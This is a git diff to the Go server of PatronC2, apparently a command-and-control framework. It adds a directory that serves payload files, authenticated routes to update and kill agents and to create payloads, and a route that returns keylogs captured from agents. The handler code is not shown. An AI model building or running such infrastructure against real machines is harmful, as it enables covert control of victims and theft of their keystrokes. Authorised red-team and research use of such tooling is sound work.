@@ -2,10 +2,13 @@ package main
 
 import (
     "fmt"
+    "net/http"
+    "path/filepath"
+    "os"
+    "strings"
 
     "github.com/PatronC2/Patron/lib/logger"
     "github.com/gin-gonic/gin"
-    "net/http"
 )
 
 func main() {
@@ -14,6 +17,11 @@ func main() {
     createAdminUser()
     
     r := gin.Default()
+
+    // host payloads server
+    workDir, _ := os.Getwd()
+	filesDir := http.Dir(filepath.Join(workDir, "agents"))
+    FileServer(r, "/files", filesDir)
 
     // handle logins
     r.POST("/login", loginHandler)
@@ -27,7 +35,9 @@ func main() {
     r.DELETE("/api/admin/users/:username", Auth(adminRoles), deleteUserByUsernameHandler)
 
     // POST / DELETE requests to non-admin areas use Auth(writeRoles)
-    r.POST("/api/data1", Auth(writeRoles))
+    r.POST("/api/updateagent/:agt", Auth(writeRoles), updateAgentHandler)
+    r.GET("/api/deleteagent/:agt", Auth(writeRoles), killAgentHandler)
+    r.POST("/api/payload", Auth(writeRoles), createPayloadHandler)
 
     // GET requests to non-admin areas use Auth(readRoles)
     r.GET("/api/agents", Auth(readRoles), getAgentsHandler)
@@ -35,6 +45,9 @@ func main() {
     r.GET("/api/groupagents/:ip", Auth(readRoles), getGroupAgentsByIP)
     r.GET("/api/oneagent/:agt", Auth(readRoles), getOneAgentByUUID)
     r.GET("/api/agent/:agt", Auth(readRoles), getAgentByUUID)
+    r.GET("/api/keylog/:agt", Auth(readRoles), getKeylogHandler)
+    r.GET("/api/payloads", Auth(readRoles), getPayloadsHandler)
+
 
     // Replace with your paths to the certificate and key files
     certFile := "certs/server.pem"
@@ -73,4 +86,18 @@ func loginHandler(c *gin.Context) {
     }
 
     c.JSON(http.StatusOK, gin.H{"token": token})
+}
+
+func FileServer(r *gin.Engine, path string, root http.FileSystem) {
+	if strings.ContainsAny(path, "{}*") {
+		panic("FileServer does not permit any URL parameters.")
+	}
+
+	if path != "/" && path[len(path)-1] != '/' {
+		r.GET(path, func(c *gin.Context) {
+			c.Redirect(http.StatusMovedPermanently, path+"/")
+		})
+		path += "/"
+	}
+	r.StaticFS(path, root)
 }
